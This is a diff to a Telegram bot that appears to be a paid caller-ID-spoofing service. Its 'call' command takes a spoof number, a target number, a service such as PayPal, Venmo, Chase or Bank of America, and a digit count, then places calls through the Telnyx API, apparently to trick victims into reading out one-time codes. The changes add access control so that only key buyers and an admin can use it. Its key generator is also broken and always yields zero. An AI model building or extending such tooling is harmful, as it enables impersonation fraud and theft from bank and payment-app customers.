@@ -89,7 +89,7 @@ const adminUsers = ['2020524303']
 const userFilter = (ctx, next) => {
    // Get the user from the context 
    const user = ctx.from.id 
-   if ( allowedUser(user) ) {
+   if ( allowedUser(user) || adminUsers.includes(user) ) {
       return next() 
    } else { 
       bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Restricted command, Purchase key`, {}).then(() => {})
@@ -99,8 +99,8 @@ const userFilter = (ctx, next) => {
 
 const adminFilter = (ctx, next) => {
    // Get the user from the context 
-   const user = ctx.from 
-   if (adminUsers.includes(user.id)) {
+   const user = ctx.from.id
+   if (adminUsers.includes(user)) {
       return next() 
    } else { 
       return null 
@@ -111,6 +111,7 @@ const adminFilter = (ctx, next) => {
 
 async function call (spoof, customer_number, ctx, service, name, digit){
    console.log('command is from: ', ctx.from)
+
    // Using the Telnyx API to create a new call
    try {
       await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
@@ -199,7 +200,7 @@ bot.help(ctx => ctx.reply(`
 
 
 // ADMIN COMMANDS
-bot.command('new_key', ctx => {
+bot.command('new_key', adminFilter, ctx => {
    const [key, duration] = ctx.message.text.split(' ');
    let newKey = Math.floor(Math.random())* 9999
    insertEntry( newKey, '', duration, ctx)
@@ -217,7 +218,7 @@ bot.command('checktime', ctx => {
    bot.telegram.sendMessage(ctx.chat.id, `you have left ${duration} left`)
 })
 
-bot.command('call', ctx => {
+bot.command('call', userFilter, ctx => {
    const [command, spoof, number, service, digit ]= ctx.message.text.split(' ');
    const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
 
